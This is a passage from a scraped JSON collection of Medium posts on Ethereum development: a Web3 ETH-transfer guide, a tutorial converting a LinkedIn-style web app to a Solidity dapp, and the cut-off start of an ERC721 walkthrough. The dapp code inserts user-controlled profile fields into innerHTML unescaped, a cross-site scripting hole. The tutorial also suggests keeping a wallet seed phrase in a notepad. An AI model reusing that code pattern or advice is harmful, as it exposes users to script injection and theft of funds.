following:web3.eth.accounts.forEach(account => {  balance = web3.eth.getBalance(account);  console.log(balance);})You probably noticed that the output is not exactly a list of numbers, that\u2019s because Web3 uses BigNumber objects for number values, since JavaScript is not able to handle big numbers correctly. You can read more about this here.You should also know that those balances are not expressed in ETH, actually those are wei values, the base unit. 1 ETH is 10\u00b9\u2078 wei. Please follow the Ethereum documentation to see more about ETH conversions.Returning to what we were saying, let\u2019s try to send ETH between two accounts. Just type web3.eth.accounts and pick two of those. Then you can use the sendTransaction method:from = web3.eth.accounts[0]to = web3.eth.accounts[1]transaction = { from: from, to: to, value: 100000 }transactionHash = web3.eth.sendTransaction(transaction)That output is the transaction hash, and you can get the transaction information with it:web3.eth.getTransaction(transactionHash)You may also want to check that the balances of the accounts that you used have changed. You can validate that with the next commands:web3.eth.accounts.forEach(account => {  balance = web3.eth.getBalance(account);  console.log(balance);})Next, I built a simple UI using HTML and jQuery with a little bit of Bootstrap just to make it pretty. You can take a look at it in my repo. This is what we call a DApp, or decentralised application. That is, an application where part of the backend code runs on a decentralized peer-to-peer network; in this case, the Ethereum network.UI of the DApp that I built to test ETH transfersYou will find an index.html file for the UI, and an app.js file hosting the interaction with the Ethereum node, that is basically what we described above in conjunction with some jQuery callbacks to populate the UI. Please feel free to clone my repo and give it a try.Thank you for reading this post, please remember that any question, feedback or suggestions are welcome! If you liked it, stay tuned for the second part of this guide, focused on smart contracts!Be part of the communityContinue the discussion on our forumJoin our Telegram groupFollow us on TwitterEven better, join the team \ud83d\ude80", "responses": 14, "tags": ["Ethereum", "Programming", "Solidity", "Web3", "Guide"]}, {"title": "Ultimate Guide to Convert a Web App To a Decentralized App Dapp", "post_link": "https://medium.com/ethereum-developers/ultimate-guide-to-convert-a-web-app-to-a-decentralized-app-dapp-f6112a079509?source=search_post", "author_name": "Merunas Grincalaitis", "author_link": "https://medium.com/@merunasgrincalaitis", "publish_date": "2018-03-15", "last_modified_date": "2018-10-28", "readtime": "14.3", "claps": 4404, "voters": 271, "content": "Ultimate Guide to Convert a Web App To a Decentralized App DappMerunas GrincalaitisFollowMar 15, 2018 \u00b7 15 min readIn this guide you\u2019ll learn all you need to take a web app that you already have and convert it into a dapp. I\u2019ll walk you through all the steps from start to finish. At the end of it, you\u2019ll know how to create your own decentralized application based on your web apps in any situation.So be sure to read the entire article and clap it 42 times to help me create more valuable content.I\u2019m writing this guide because I ran a survey of about 100 responses where one of the most demanded topics was how to convert a web app to a dapp. If you\u2019re a web developer, you\u2019ll love this guide even though you\u2019ll have to research about Solidity programming for your own needs later on.This tutorial is ideal for people who have some experience developing Smart Contracts but don\u2019t know how to actually apply their knowledge to create something useful with a dapp. We\u2019ll start from scratch so anybody can use this guide.You must have a web app already created since I\u2019ll show you a web app and we will convert it but we won\u2019t create the web app from scratch.Your goal with this guide is to read and understand the process behind the conversion of a web app to a dapp. Then it\u2019s your choice to apply this information into your own projects.In order to show you how it is done, I\u2019ll create a simple web app project based on the popular social media site Linkedin with less features. Then, you\u2019ll see how to make it decentralized.Here\u2019s the index of the contents in this guide:Preparation. Tools needed for the jobIntroduction. The web app that we are going to convertSmart Contracts. Creating the Smart Contracts required for the dappWeb3. Connecting the Smart Contracts to the web appConclusion1. Preparation. Tools needed for the jobBefore showing you the project, you need to know the tools that we are going to use to convert such web app to a dapp.A decentralized application is just a web app where the server-database logic is stored on the blockchain. For instance, if you want to write a short, decentralized tweet in a dapp, the text will be stored on the Ethereum blockchain via a Smart Contract in a string variable.A Smart Contract is the code that help us communicate with the blockchain to store data and use it.So to start you need to download metamask. In order to communicate with the blockchain via Smart Contracts, we need Metamask which is a chrome and firefox extension where you can connect to a free server that has the latest Ethereum blockchain downloaded. It\u2019s a tool for connecting to Ethereum in \u201cDeveloper mode\u201d.Go to metamask.io and download the chrome or firefox extension.Then click the little icon at the top of your browser:Accept the terms, create a new password:And copy your 12-word private seed somewhere in a notepad:Now you\u2019ll see that you\u2019re connected on the main network. Click on the mainnet icon:And change it to ropsten:Ropsten is a test blockchain where Ether doesn\u2019t have any real monetary value. It\u2019s a free blockchain used for development. You needed it because you don\u2019t want to spend real money when testing and designing your dapp.Now that you have metamask set up and ready, let\u2019s see the next tool that you\u2019ll need to create the decentralized application: the Remix IDE code editor.Remix is a very interesting dapp where you can develop Smart Contracts, deploy them to the blockchain of your choice and interact with those Smart Contracts right away.Go to remix.ethereum.org.It is essential for developing and getting started. The most important aspects of this code editor are the code section, where you\u2019ll write your code:The console section where you\u2019ll see the response from the blockchain when using your Smart Contracts:And the Run section, which you\u2019ll use to interact and deploy your contracts:Now that you\u2019re familiar with the interface that you\u2019ll use for developing the Smart Contracts needed for converting your web app into a dapp, you can go ahead and continue with the next section.2. Introduction. The web app that we are going to convertFirst let\u2019s see the web app that we are going to decentralize. This is a simple linkedin-like application where users can create accounts, follow other users and they can write small messages.Here\u2019s a gif of how the web application looks like:You can see the web app in action here: https://decentralized-linked.github.io/And the source code here: https://github.com/decentralized-linked/decentralized-linked.github.ioIt\u2019s a simple web app without a server for simplicity sake where you can follow people, write messages and configure your profile. Our goal is to make it decentralized so it works with Ethereum.For now you need to write down the functionality that requires a server. For instance in this application:The accounts and messages are stored on a database each time an action is takenThe server saves on the database who you\u2019re followingThe remaining functionality is made with plain javascript on the browser. So the information that we will store on the blockchain is:User accounts with names, occupations and biosThe number of followers for each userThe messages with the content, who wrote each message and whenAfter writing down what information you are storing on your centralized database, you can continue with the next section. You\u2019ll need that information for creating the Smart Contracts.Ready for the code? If you think this guide is worth your time you can clap it and share it. Otherwise just keep reading and apply what you learn. You can also help me create content that you like by filling this short survey in 1 min: https://goo.gl/forms/Vns2xlFY4dpgsEMA23. Smart Contracts. Creating the Smart Contracts required for the dappA Smart Contract is a programming file usually written in the language Solidity where you define all the logic required for communicating with the blockchain.Smart Contracts store the information that you would have stored on a centralized database.They also contain the logic for processing that information in the blockchain. It\u2019s like your server side code but simpler.The first step for creating the Smart Contracts required for decentralizing your web app, is to write the variables used. In the previous section you wrote down the information stored on the database. That\u2019s the information that will be stored in the Smart Contract.So open remix.ethereum.org and create the variables:pragma solidity 0.4.21;contract Linked {    // User profile    struct User {        bytes32 name;        bytes32 occupation;        string bio;    }        // The structure of a message    struct Message {        string content;        address writtenBy;        uint256 timestamp;    }        // Each address is linked to a user with name, occupation and bio    mapping(address => User) public userInfo;        // Each address is linked to several follower addresses    mapping(address => address[]) public userFollowers;        // The messages that each address has written    mapping(address => Message[]) public userMessages;        // All the messages ever written    Message[] public messages;}A struct is a type of variable that allows you to create a new type of variable with several internal properties. In this case I\u2019ve created the structs User and Message:Each user will have a name, occupation and bio.The Message has the content of the message, the address of the user that wrote the message and the timestamp when it was written.You can learn more about each type of variable in the official docs: http://solidity.readthedocs.io/en/v0.4.21/types.htmlAfter creating your variables, you want to code functions that will use those variables. My web app has the following functions:Set the user profile by saving the data in a database2. Write a message that will be stored in the database with the content of the message, who wrote it and the timestamp of the message3. Follow and unfollow users. Each user is linked with several followersLet\u2019s create them one-by-one in your Smart Contract using unique functions.1. Set the user profile by saving the data in a database:Here\u2019s how I\u2019d do it in my Smart Contract:// Sets the profile of a user function setProfile(bytes32 _name, bytes32 _occupation, string _bio) public {    User memory user = User(_name, _occupation, _bio);    userInfo[msg.sender] = user;}This function is receiving the name, occupation and bio of the user and it\u2019s updating the mapping of that user. The mapping links the address of the sender with his user information. We are overriding that information here.In your web app you may would have stored that information by making an API call to a node.js server which would store that information inside a mondodb database. In decentralized apps, all that logic is inside the Smart Contract written in Solidity.2. Write a message that will be stored in the database with the content of the message, who wrote it and the timestamp of the message// Adds a new messagefunction writeMessage(string _content) public {    Message memory message = Message(_content, msg.sender, now);    userMessages[msg.sender].push(message);    messages.push(message);}The function receives the content of the message. Then it creates a temporary message struct instance with the content, the address of the sender and the current timestamp. Finally it adds the message to the array of messages of that user and it also adds the message to the public array of all the messages.The keyword now is the current time in a unix format of 10 numbers. I\u2019m using it for the timestamp of each message.3. Follow and unfollow users. Each user is linked with several followers// Follows a new userfunction followUser(address _user) public {    userFollowers[msg.sender].push(_user);}    // Unfollows a userfunction unfollowUser(address _user) public {    for(uint i = 0; i < userFollowers[msg.sender].length; i++) {        if(userFollowers[msg.sender][i] == _user) {            delete userFollowers[msg.sender][i];        }    }}The follow function adds that follow address to your mapping of follows.The unfollow user function loops through all your follows and removes that user address for the array. Note that this will only work for a small amount of addresses, up to about 200 loops since the number of loops is limited by the gas sent in the transaction when executing the unfollow function.You can see that the for loop is very similar to the one of similar languages lika java or c++.Great, we now have the variables and functions using those variables.After your Smart Contract code is ready, deploy it on ropsten by going to the Run tab on the right or the Remix code editor:Make sure you\u2019re using the Injected Web3 from Metamask and that your metamask account is connected to Ropsten like you saw before:You\u2019ll need test ropsten Ether for deploying and using the contract. You can get test ether by going to https://faucet.metamask.io/ and clicking on request 1 Ether:Then go back to Remix and deploy the Smart Contract by clicking on Create and confirming the transaction in Metamask:The last thing is to use those functions on your web app. Learn how in the next section.4. Web3. Connecting the Smart Contracts to the web appTo use that decentralized Smart Contract on your web app as a database, you will use a javascript library called web3.js.Go to your web app project folder and create an empty file called web3.min.js using your favorite text editor. I like atom.io.Then go to the official github repository of web3 and copy the web3 min code from here: https://github.com/ethereum/web3.js/blob/develop/dist/web3.min.jsClick on raw:Select the code with CTRL + A and copy it with CTRL + C. Then paste it in your empty web3.min.js file and save it:Next, import it in your main html file:Alternatively, you can install web3 with nodejs:npm i -S web3And require it if you\u2019re using webpack or any other tool to combine your javascript files:const Web3 = require('web3')// Orimport Web3 from 'web3'Now that you have the library there, you have to initialize web3 like so:// Remember that we are using ropsten for this application. Once completed we may deploy it to the mainnet for public usewindow.web3 = new Web3(window.web3 ? window.web3.currentProvider : new Web3.providers.HttpProvider('https://ropsten.infura.io'))What I\u2019m doing there is setting the global variable web3 in lowecase to the new Web3 provider. If it\u2019s already defined because metamask injected it, I just use that provider injected. Otherwise, I create a new provider with infura. You can learn more about infura here if you\u2019re curious: https://infura.io/Note that you will only be able to use this application if you have metamask, mist or similar for connecting to the blockchain and signing transactions.After that, you have to initialize the Smart Contract that you\u2019ll use for your web app. You can do it like so:const contractABI = [Your-JSON-ABI]const contractAddress = '0x70ae16608789f81604fd2f485fb81bc02cf0f8cb'const contractInstance = web3.eth.contract(contractABI).at(contractAddress)You need the contract ABI and the contract address. Then you can create the instance.The ABI is a JSON document with the names of all the functions in your smart contract. Required for executing functions in web3.js.To get the ABI, go back to Remix and in the Compile tab, click on Details:Then click on the Copy button next to the ABI section:Before using that JSON ABI code, you need to eliminate the spaces since it\u2019s a json formated document. Go to https://www.cleancss.com/json-minify/, paste your ABI there and click on JSON Minify:Then copy the output down below by right clicking on the selected text:Go back to your code and paste that information into a variable:const contractABI = [{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"},{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"userMessages\",\"outputs\":[{\"name\":\"content\",\"type\":\"string\"},{\"name\":\"writtenBy\",\"type\":\"address\"},{\"name\":\"timestamp\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"userInfo\",\"outputs\":[{\"name\":\"name\",\"type\":\"bytes32\"},{\"name\":\"occupation\",\"type\":\"bytes32\"},{\"name\":\"bio\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"},{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"userFollowers\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"messages\",\"outputs\":[{\"name\":\"content\",\"type\":\"string\"},{\"name\":\"writtenBy\",\"type\":\"address\"},{\"name\":\"timestamp\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"followUser\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_name\",\"type\":\"bytes32\"},{\"name\":\"_occupation\",\"type\":\"bytes32\"},{\"name\":\"_bio\",\"type\":\"string\"}],\"name\":\"setProfile\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"unfollowUser\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_content\",\"type\":\"string\"}],\"name\":\"writeMessage\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]Now you need the address of the contract that you deployed earlier in remix. Go back to remix and copy the contract address which you\u2019ll find in the Run tab down below:If you don\u2019t see the contract address, refresh the page and deploy it again on Ropsten. You\u2019ll have to wait until the transaction is processed by the miners. Now set that address into a variable:const contractAddress = '0x9d198b2a209481b08e570aa7a629a6661cd33f24'And create your contract instance that you\u2019ll use for executing the functions of the Smart Contract:const contractInstance = web3.eth.contract(contractABI).at(contractAddress)If you remember the web app that we are decentralizing:You can see that there\u2019s a function to see the profile information. So to make it work with the decentralized Smart Contract that you just created, you have to open the javascript file that contains that function and update it with the contract instance code:function initMyProfile() {    contractInstance.userInfo(web3.eth.accounts[0], (err, myProfile) => {        if(err) return alert(err)                let profileContent = ''        myName = web3.toUtf8(myProfile[0])        let myOccupation = web3.toUtf8(myProfile[1])        let myBio = myProfile[2]profileContent += `            Name: <span id=\"my-name\">${myName}</span> <br/>            Occupation: <span id=\"my-occupation\">${myOccupation}</span> <br/>            Bio: <span id=\"my-bio\">${myBio}</span> <br/>            <button id=\"set-profile-button\" class=\"align-center\" onclick=\"setProfile()\">Set Profile</button>`        document.querySelector('#profile-content').innerHTML = profileContent    })}Here\u2019s what I did to decentralize the function to get the profile information about the user:The userInfo is a public variable, which allows us to execute it as a function with the right parameters to get its value. The first parameter is the current user address, which you can get with web3.eth.accounts[0] remember that you need to be connected to metamask and that your code is served via a local server. You can do it by installing npm i -g http-server and executing http-server on your project directory.If the function is getting the data correctly from the Smart Contract, the variable myProfile will be an array with the name, occupation and bio of the user. Each of those values can be accesed in order like so myProfile[0] // This is the name myProfile[2] // This is the bioNow because we defined the variables name and occupation as bytes32, the information is stored in a hexadecimal string of 32 values. You need to convert that information to a human readable text with the function web3.toUtf8(myProfile[1]) . Note that this is for the version 0.20.0 of web3.js. If you\u2019re using a newer version, the function will be different so make sure to check the official documentation of web3 for your version by searching on google.That\u2019s how you get the information from the blockchain via the Smart Contract instead of a server with its database. That Smart Contract information will be available 24/7.Next I\u2019m updating the saveProfile() function that will update the profile information of the current user like so:function saveSetProfile(name, occupation, bio) {    contractInstance.setProfile(name, occupation, bio, (err, result) => {        console.log(err, result)    })}You can see that I\u2019m executing the function setProfile() of the Smart Contract with the name, occupation and bio. Then I\u2019m logging the information about the error and the result.When that function is executed in your front-end javascript, you\u2019ll receive a metamask notification asking you to confirm the contractInstance.setProfile() function transaction.Now you have to keep doing the same for all the functions of your web app. Your goal is to make them decentralized. This means that instead of getting the information from a centralized database with some server logic, you have to use Smart Contracts.Here are the steps to help you convert the functions of your web app to dapp functions:Create the Smart Contract with variables that will store the information that you\u2019re storing right now on a database. To do so, you\u2019ll need to learn about Solidity types in the official docs or in my other guideInitialize the Smart Contract on your web app with web3.js using its ABI and addressConvert all of your existing web app functions to their decentralized version with web3 and the contract instance that you just createdConclusionYour final dapp will be different from the original web application. Some information will be stored in a different type of variable and you\u2019ll have to use tricks to get around the limitations of the blockchain. Whenever you get stuck, search for an anwser on google and try different things.It\u2019s important that you have a solid understanding about Smart Contract development so be sure to read the docs and keep expanding your knowledge. Most of the things are possible on the blockchain if you\u2019re creative.One of the best exercices that you can do for learning faster is to try to convert all of your existing web apps to dapps. Then you\u2019ll learn the small things that make you a great Ethereum Developer.Thanks for reading the article. Make sure to share it with your friends on twitter, reddit and linkedin. Let me know if you get stuck somewhere and I\u2019ll try to help you. I\u2019m usually very busy so it might take me a while to get back to you.Join my private Ethereum Developers facebook group to get up to speed faster than you could ever go alone here: https://www.facebook.com/groups/ethereumdevelopers/You can get my book \u201cEthereum Developer: Learn Solidity From Scratch\u201d from my website for $20 USD in PDF here: https://merunas.io/bookYou\u2019ll receive exclusive information that you won\u2019t find anywhere else along with an awesome active community willing to help you whenever you need it.You can follow me on linkedin, twitter and on medium. What content do you want me to write about? Fill this short-1-minute survey with your choices and I\u2019ll write about the most requested topics https://goo.gl/forms/Vns2xlFY4dpgsEMA2Do you thing this information is valuable? The clap it 1 or 50 times it really helps me help more people so its a win-win situation for all of us :)", "responses": 21, "tags": ["Ethereum", "Ethereum Blockchain", "Blockchain", "Solidity", "Bitcoin Mining"]}, {"title": "Walking Through the ERC721 Full Implementation", "post_link": "https://medium.com/blockchannel/walking-through-the-erc721-full-implementation-72ad72735f3c?source=search_post", "author_name": "Karen Scarbrough", "author_link": "https://medium.com/@kscarbrough1", "publish_date": "2018-03-29", "last_modified_date": "2018-06-20", "readtime": "16.2", "claps": 2416, "voters": 255, "content": "Walking Through the ERC721 Full ImplementationA Deep Dive into Managing ERC721 AssetsKaren ScarbroughFollowMar 29, 2018 \u00b7 17 min readTL;DRBasically, since ownership of ERC721\u2019s is based on the ownership of a unique index or id, the fundamentals of token creation and transfer need to be extrapolated to accommodate that case. Also, the latest full implementation includes a safeTransferFrom() function that checks for implementation of a standard interface prior to transferring tokens.ERC721 TokensI have seen a lot of material around the interest in ERC721\u2019s as non-fungible tokens that can hold metadata, but the depth of the material that I have found has left me looking for more details. My interest in ERC721\u2019s started back at EthDenver back in February \u2014 you can read about about our project using ERC721\u2019s here. I have since followed updates on the implementation of the ERC721 standard because I see a lot more value arising out of this design. As a full implementation of ERC721 rolled out from Open Zeppelin this week, I wanted to write up a resource for developers interested in creating their own ERC721 tokens. It took me a while to wrap my head around it, so hopefully, this can help get you there faster if you haven\u2019t look at the ERC721 EIP yet. I tried to balance elements of Solidity and ERC20\u2019s while introducing ERC721\u2019s here. Side note, there is an awesome new site that consolidates all merged EIPs that I highly recommend checking out.To me, token standards can be summarized and compared in the following ways:Ownership \u2014 How is token ownership handled?Creation \u2014 How are tokens created?Transfer & Allowance \u2014 How are tokens transferred, and how do we allow other addresses (contracts or externally owned accounts) transfer capability?Burn \u2014 How do we burn or destroy a token?Understanding how these operations work helps to put a complete picture of how a token standard works. The below follows the OpenZeppelin ERC721Token.sol full implementation and amalgamates some additional knowledge of Solidity and other EIPs. As a first stab at documentation, I\u2019m sure this will continue to evolve, and I will try to keep it updated. Any recommendations appreciated.Token OwnershipAs the the most popular token standard to date, ERC20\u2019s have become a standard of comparison for new token proposals. They are fairly easy to understand, at least now that I look back anyways. In terms of ownership, what ERC20\u2019s come down to is a mapping the balances of tokens to their respective owners\u2019 addresses:mapping(address => uint256) balancesIf you have purchased an ERC20 token, your ultimate ownership of that token is verified through the contract in which you bought it as the contract maintains a record of how many tokens (uint256) each address (address) holds. If we want to transfer our ERC20 tokens, then our balance is verified through the balances mapping so that we do not try to send more than we own. A question that may come to mind is, if I have never interacted with a particular token contract, how does it know my balance is zero? The above balances mapping initially defaults to zero, so even if you have never touched a particular token contract before, if you want to check your balance of that token, your balance will be appropriately verified as zero.We have heard over and over again how ERC721\u2019s are non-fungible, which again, for the millionth time means that tokens of the same class or contract can hold a different value. A value of one ERC721 Cryptokittie does not equal the value of another ERC721 Cryptokittie because they are each unique. In order for this to be true, we can no longer simply map an address to a balance. We have to know each unique token that we own.For this reason, in the ERC721 standard, ownership is determined by an array of token indexes or ids that is mapped to your address. Since each token value is unique, we can no longer simply look at a balance of tokens \u2014 we have to look at each individual token created by the contract. The main contract keeps a running list of all the ERC721 tokens created in that contract in an array, so each token has its\u2019 respective index within the context of all ERC721 tokens available from that particularity contract via the allTokens array.uint256[] internal allTokensHowever, we also need to know which tokens we own, not just what the contract holds. So, in addition to the array of token indexes in the entire contract, each individual address has an array of token indexes or ids that is mapped to their address as ownership. We do not simply map an address to a token index because what if an individual owns more than one token? If we were only mapping individual indexes, say we owned token number 5 and that was mapped to our address. However, tomorrow, we buy token 6, then if we had only mapped individual values number 5 would be overwritten by number 6 in our mapping, and we would no longer have a recorded that we owned token 5 as well \u2014 hence the need for an array.mapping (address => uint256[]) internal ownedTokensThis simple difference spurs many of the additional requirements of an ERC721 token. With an ERC20 token, we were checking against a balance, but now, we need to check ownership against a specific index of a token. To rearrange this array when we transfer tokens necessitates further requirements.So do we iterate through our array of tokens each time we want to verify ownership of a certain token index? No, there is a much simpler and safer way. Rather, in addition to our array of token indexes that we own, we map each token index or id to an owner. In this way, every time we would like to know who owns a certain token index, we need only provide the token index to check the address to which it is mapped. (This variable is included in the ERC721BasicToken.sol, which is inherited into ERC721Token.sol.)mapping (uint256 => address) internal tokenOwnerWhy do we do this in addition to the array? Can\u2019t we just iterate through our array of tokens to ensure we own a specific token? Let\u2019s first ask this question: If we transfer tokens, can\u2019t we just add or delete tokens indexes to our array? Unfortunately, no. Recall that in Solidity, should we decide to delete an element in an array, the element is not actually, fully deleted but replaced with a zero. For example, let\u2019s say that we have an array myarray = [2 5 47], which is of length 3. However, then we call a function that says to delete myarray[myarray.length.sub(1)]. Although we may expect that myarray = [2 5], we actually have the following array myarray = [2 5 0], and it would still be of length 3. We do not magically own the token of id 0, so this presents a problem. Recall that delete does not actually \u201cdelete\u201d values in Ethereum but rather resets them to zero. Certainly, there are cases in which we would like to delete or remove a token from the ownership of an address. Rather than simply delete tokens from our array, we rather rearrange our array. We will see later on when we look at transferring (removing ownership) and burning tokens how this information comes into play. For this reason, we also keep track of the below. The ownedTokensIndex maps each token id to its respective index in its owner\u2019s array. As stated below, we also map the token id to its index in the allTokens array as well.// Mapping from token ID to index of the owner tokens list mapping(uint256 => uint256) internal ownedTokensIndex; //Mapping from token id to position in the allTokens array mapping(uint256 => uint256) internal allTokensIndex;Another issue we may come across is if we want to check how many ERC721 tokens that we actually own. At this point, we introduce one more variable to keep track of ownership. (Again, this variable is in ERC721BasicToken.sol and inherited into ERC721Token.sol.)mapping (address => uint256) internal ownedTokensCountNow, we map a number to keep track of how many tokens that we do own to our address. This ownedTokensCount is updated as we purchase, transfer or potentially burn tokens accordingly. Why do we need to keep track of how many ERC721 tokens we own? Verification. Let\u2019s say we want to transfer all of our ERC721 tokens to a new address? Or just check that we own a certain amount?At this point, we can see how introducing the ownership of a unique token adds new complexity to the ownership of a token. But what about the creation of these ERC721 tokens?Token CreationRecall that in the case of ERC20 tokens, we are mapping against a balance of tokens. Hence in order to create ERC20 tokens, we need only to set or increase the total tokens available. In the ERC20 design, we have a value that maintains our total available token supply, totalSupply_ below. In some cases, you may have seen a ERC20 token contract set the total supply through a value initialized in the constructor. Recall that a constructor function is run once to initialize a contract (but it is not required). The constructor must carry the exact same name as the contract \u2014 if it does not carry the same name as the contract, the EVM will register your intended constructor as a normal function and that means any one can call it after contract creation, which can present numerous security vulnerabilities depending on what you are doing. The constructor code is part of the transaction that creates the contract, but it is not part of the contract at the deployed location. The constructor may be used to set initial values, ownership, etc. In the below, MyToken is used to set the value of the totalSupply_ of tokens. With increased demand to allow for variability of the amount of ERC20 tokens within a contract, the ERC20 standard was expanded to also include a mint function in which a desired amount of tokens is added to the totalSupply_ and balances are mapped accordingly. Note that in the below Transfer is an event, not a function \u2014 am I the only one who has spent time trying to look for a function that turn out to be an event while reading Solidity? Anyways, again you can see from the mint function where our balance is updated.uint256 totalSupply_- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - //Example of setting token supply via constructorcontract MyToken {    function MyToken(uint _setSupply)          { totalSupply_ = _setSupply_ }.....//Example of maintaining a variable token supply via mintingfunction mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) { totalSupply_ = totalSupply_.add(_amount); balances[_to] = balances[_to].add(_amount); Mint(_to, _amount); Transfer(address(0), _to, _amount); return true; }As to ERC721\u2019s, we have learned that since each individual token is unique, we must create each individual token. With ERC20, we can easy create a batch of 100 more by adding to the totalSupply_. However, since we maintain an array of tokens in an ERC721 standard, we need to add each token to that array separately.Here we see two functions that look to a ERC721 contract\u2019s total supply addTokenTo() and _mint(). Let\u2019s go over addTokenTo() first.Here we call addTokenTo() from our full implementation contract, and then, the super.addTokenTo() allows us to first call the addTokenTo() function in our basic ERC721 contract. Essentially, over the the course of these two functions, we update all global ownership variables. The functions take in two parameters _to or the address to which the token will be owned and _tokenId or the unique id of the token \u2014 chosen by whomever you allow to call this function, you\u2019d likely limit this call to the owner of the contract. In this case, the user can choose any unique number id. First, in the ERC721BasicToken contract, we check that the token id is not already owned. Then we set the token owner of the requested token id, and add one to the number of owned tokens of that individual account. Going back to the full implementation contract, we also update the array of the new owner\u2019s (_to)tokens by adding this new token to the end of their ownedTokens array and saving the index of that new token.From the above, we can see that addTokenTo() updates an address to an individual. However, what about the allTokens array? This is where _mint fills in the gap. Here we see when we call _mint() from our full implementation ERC721 contract that again we jump up to our basic implementation, which ensures that we are not minting to an address of zero and calls addTokenTo(), which as confusing as it is, will actually call back to our full implementation contract to kick off the addTokenTo() calls. (Again, Transfer() is an event, not a function.) After the _mint() function in the basic contract is completed, back in our full implementation, we add the _tokenId to our allTokensIndex\u2019s mapping as well as our allTokens array.From the above, you can see that although you can call addTokenTo() by itself, what you need to do to maintain all information in a full implementation ERC721 contract is use _mint() to create your new tokens.But what about the metadata that ERC721\u2019s can supposedly hold? We have created tokens and token ids, but they are not holding any data yet. Open Zeppelin gives us an example of how this could look with a mapping a token id to a string to of URI data.// Optional mapping for token URIs mapping(uint256 => string) internal tokenURIs;In order to set a token\u2019s URI data, the following _setTokenURI() function is also included. Here using the token Id that you created via _mint() and your desired URI information, you can set the data that is mapped to a token ID in tokenURIs. Note the requirement in this function that we determine that a token Id exists (meaning someone owns it) prior to assigning data.Although more complex and gas intensive, I find the ability to use a struct to store data instead of a mapping to an index far more interesting \u2014 at the least, creating a non-fungible token with a handful of variables is still far less expensive than creating a smart contract per each \u201casset\u201d instead. In any case, if you are wondering how to include different data, these elements are what you would want to look at changing.Transfer & AllowanceAs before, let\u2019s first review how transfers and allowance happens in the ERC20 standard. We can transfer an ERC20 token directly using the transfer() function in which we specify an address that we want to send to and how much, which is checked against our balances and then updated in the main ERC20 contract.function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0));   require(_value <= balances[msg.sender]);   balances[msg.sender] = balances[msg.sender].sub(_value);    balances[_to] = balances[_to].add(_value); Transfer(msg.sender, _to, _value);  return true; }But, what do we mean by allowance? When we want another contract or address to be able to transfer our ERC20 tokens, we need to allow the use the ERC20 contract address to do that for us \u2014 this need arises in many instances in distributed applications \u2014 escrows, games, auctions, etc. Hence, we need a way to approve other address to spend our tokens. Then, another transfer function requires the contract to check the allowance of who is allowed to spend them. I\u2019ll start with how allowance is set up, and then show how that plays into transfers.In the ERC20 standard, we have a global variable allowed in which an owners address is mapped to an approved spender\u2019s address and then mapped an amount of tokens. In order to set this variable, there is an approve() function in which an individual is able to map an approval to their desired _spender and _value. Notice that here, we are not checking that actual amount of tokens owned by the sender \u2014 that comes later at transfer. Once more, Approval is an event not a function.//Global variablemapping (address => mapping (address => uint256)) internal allowed//Allowance of another address to spend your tokensfunction approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; }Now, once we have approved another address to transfer our tokens, how are our tokens actually transferred? Our approved spender would use the transferFrom() function below in which they would specify the _from or original owner\u2019s address, the receiver\u2019s address _to and the amount _value. Here we check that the original owner actually possesses the amount desired to be transferred with require(_value \u2264 balances[_from]) , then we check that the msg.sender is allowed to transfer the balance through the allowed variable and ultimately we update all of our mapped balances as well as our allowed amounts. Again, Tranfer is an event. Note, there are two additional functions included to allow for increasing (increaseApproval()) and decreasing (decreaseApproval()) an approved spender\u2019s allowance as well.So, once more, we need to think that instead of approval and transfer of balances, in the case of ERC721\u2019s, we need to approve and transfer token ids. The ERC721 standard offers the chance approve an address for token transfer by id or we can approve an address to transfer all owned tokens. To approve transfer by id, we use the approve() function as below. Here a global variable, tokenApprovals, maps a token index or id to an address that is approved to transfer it. In the approve() function, we first check for ownership or if the msg.sender isApprovedForAll() . Further below, you can see that you can use the setApprovalForAll() function to approve one address to transfer and handle all of the tokens that are owned by a particular address as we have a global variable operatorApprovals in which the owner\u2019s address is mapped to a approved spender\u2019s address and then mapped to a bool. This is set to 0 or false by default, but by using setApprovalForAll() we can set this mapping to true and allow an address to handle all of the ERC721\u2019s are owned. Note, if a spender is approved for all tokens, then they can also assign additional address spend capabilities. Next, we use getApproved() to check that we are not setting approval for address(0) . At last, our tokenApprovals mapping is completed to the desired address. And like ERC20, Approval is event.Now, we arrive to how we actually transfer ERC721\u2019s. The full implementation actually offers a two ways in which to transfer. The first method is discouraged, but let\u2019s go over it to understand. In transferFrom(), the sender and receiver addresses are specified along with the _tokenId to transfer, and we use a modifier, canTransfer() to ensure that the msg.sender is approved to transfer the token or owns it. After checking the sender and receiver addresses are valid, the clearApproval() function is used to remove the approval of the transfer from the original owner of the token, so that a previously approved spender may not continue to transfer the token. Next, the removeTokenFrom() is called in the ERC721 full implementation contract, and similar to the addTokenTo() function using super to call the removeTokenFrom() function in the ERC721 basic implementation. You can see that the token is removed from the ownedTokensCount mapping, the tokenOwner mapping, and one more twist is that we move the last 